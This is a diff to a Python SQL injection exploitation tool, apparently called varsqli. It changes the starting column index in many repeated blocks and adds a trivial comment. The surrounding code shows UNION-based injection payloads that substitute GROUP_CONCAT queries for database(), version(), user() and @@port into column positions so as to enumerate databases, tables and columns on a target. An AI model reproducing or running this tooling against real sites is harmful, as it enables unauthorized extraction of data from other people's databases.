@@ -1,3 +1,4 @@
+# hi
 import requests
 import argparse
 import re
@@ -246,7 +247,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                             if args.dbs:
                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting fetching Database name..............")
                                 num = count_num
-                                nums = [num for num in range(2, num+1)]
+                                nums = [num for num in range(1, num+1)]
                                 for numbers in nums:
                                     payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                     split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -279,7 +280,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                     if args.TB:
                                         if args.CO:
                                             num = count_num
-                                            nums = [num for num in range(2, num+1)]
+                                            nums = [num for num in range(1, num+1)]
                                             for numbers in nums:
                                                 pl1 = "(SELECT GROUP_CONCAT(user(),'::',@@port))"
                                                 pl2 = re.sub(r"\b{}\b".format(numbers), pl1, payload)
@@ -316,7 +317,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 if args.DB:
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -355,7 +356,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 if args.DB: 
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -402,7 +403,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 if args.DB:
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -435,7 +436,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -467,7 +468,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns and Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -547,7 +548,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                             if args.dbs:
                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting fetching Database name..............")
                                 num = count_num
-                                nums = [num for num in range(2, num+1)]
+                                nums = [num for num in range(1, num+1)]
                                 for numbers in nums:
                                     payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                     split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -580,7 +581,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                     if args.TB:
                                         if args.CO:
                                             num = count_num
-                                            nums = [num for num in range(2, num+1)]
+                                            nums = [num for num in range(1, num+1)]
                                             for numbers in nums:
                                                 pl1 = "(SELECT GROUP_CONCAT(user(),'::',@@port))"
                                                 pl2 = re.sub(r"\b{}\b".format(numbers), pl1, payload)
@@ -617,7 +618,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 if args.DB:
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -656,7 +657,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 if args.DB: 
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -703,7 +704,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 if args.DB:
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -736,7 +737,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
@@ -768,7 +769,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                                     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns and Tables name.......")
                                     num = count_num
-                                    nums = [num for num in range(2, num+1)]
+                                    nums = [num for num in range(1, num+1)]
                                     for numbers in nums:
                                         payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
